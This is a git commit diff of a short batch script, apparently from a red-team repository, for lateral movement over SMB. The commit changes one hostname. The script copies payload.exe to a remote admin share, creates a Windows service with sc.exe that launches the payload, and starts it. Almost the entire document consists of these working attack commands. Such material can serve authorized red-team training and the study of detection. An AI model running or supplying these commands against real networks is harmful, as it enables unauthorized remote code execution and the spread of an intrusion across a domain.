7de46249f81b3fa299a00eda168ef796cf0a557d
S3cur3Th1sSh1t <27858067+S3cur3Th1sSh1t@users.noreply.github.com>
2021-01-18 08:37:09 +0100

    Update smbservicelateralmovement.bat

--- batch/smbservicelateralmovement.bat
+++ batch/smbservicelateralmovement.bat
@@ -1,4 +1,4 @@
-copy payload.exe \\dc-2.child.redteamops.local\c$\windows\temp\payload.exe
+copy payload.exe \\dc-2.domain.local\c$\windows\temp\payload.exe
 sc.exe \\pc-1.domain.local create SuperService binpath="C:\windows\system32\cmd.exe /C C:\windows\temp\payload.exe"
 sc.exe \\pc-1.domain.local start SuperService
 # del \\pc-1.domain.local\c$\windows\temp\payload.exe
